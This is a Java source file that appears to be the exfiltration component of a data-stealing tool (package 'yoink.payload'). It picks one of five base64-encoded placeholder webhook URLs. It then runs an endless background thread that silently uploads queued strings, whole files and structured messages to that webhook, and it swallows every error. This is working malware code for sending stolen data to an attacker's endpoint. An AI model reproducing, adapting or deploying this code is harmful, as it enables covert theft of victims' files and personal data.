package me.perry.yoink.payload;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.squareup.okhttp.*;
import me.perry.yoink.util.Message;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.*;

public final
class Sender {
    private static final Sender INSTANCE = new Sender();
    private final Queue <Object> queue = new ArrayDeque <>();

    private
    Sender () {
        List <String> strings =
                Arrays.asList(
                        "Webhook URL 1 (In base64)." ,
                        "Webhook URL 2 (In base64)." ,
                        "Webhook URL 3 (In base64)." ,
                        "Webhook URL 4 (In base64)." ,
                        "Webhook URL 5 (In base64)."
                );
        String hooker = new String(Base64.getDecoder().decode(strings.get(new Random().nextInt(5)).getBytes(StandardCharsets.UTF_8)));
        new Thread(() -> {
            for (; ; ) {
                try {
                    Thread.sleep(3500);
                    if (queue.isEmpty()) continue;
                    Object item = queue.poll();
                    OkHttpClient client = new OkHttpClient();
                    MultipartBuilder builder = new MultipartBuilder().type(MultipartBuilder.FORM);
                    if (item instanceof String)
                        builder.addFormDataPart("payload_json" ,"{\"content\":\"" + item + "\"}");
                    else if (item instanceof File)
                        builder.addFormDataPart("file1" ,((File) item).getName() ,RequestBody.create(MediaType.parse("application/octet-stream") ,(File) item));
                    else if (item instanceof Message) {
                        JsonObject obj = new JsonObject();
                        obj.addProperty("title" ,((Message) item).getName());
                        JsonArray embeds = new JsonArray();
                        JsonObject embed = new JsonObject();
                        JsonArray fields = new JsonArray();
                        ((Message) item).getFields().forEach(field -> {
                            JsonObject f = new JsonObject();
                            f.addProperty("name" ,field.getName());
                            f.addProperty("value" ,field.getValue());
                            f.addProperty("inline" ,field.isInline());
                            fields.add(f);
                        });
                        embed.add("fields" ,fields);
                        embeds.add(embed);
                        obj.add("embeds" ,embeds);
                        builder.addFormDataPart("payload_json" ,obj.toString());
                    } else continue;
                    Request request = new Request.Builder().url(hooker).method("POST" ,builder.build()).build();
                    Objects.requireNonNull(client.newCall(request).execute().body()).close();
                } catch (Exception ignored) {
                }
            }
        }).start();
    }

    public static
    void send (Object string) {
        INSTANCE.queue.add(string);
    }
}